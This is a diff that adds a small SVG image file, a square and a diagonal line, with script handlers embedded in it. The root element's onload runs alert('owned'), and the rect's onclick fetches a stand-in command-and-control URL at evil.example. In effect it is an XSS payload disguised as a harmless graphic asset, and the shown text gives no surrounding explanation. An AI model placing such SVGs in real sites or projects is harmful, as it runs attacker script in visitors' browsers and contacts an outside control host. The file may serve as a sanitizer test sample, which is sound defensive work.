@@ -1,0 +1,4 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" onload="alert('owned')">
+  <rect x="10" y="10" width="50" height="50" stroke="#ff0000" fill="none" onclick="fetch('https://evil.example/c2')"/>
+  <path d="M 0 0 L 100 100" stroke="#000000"/>
+</svg>
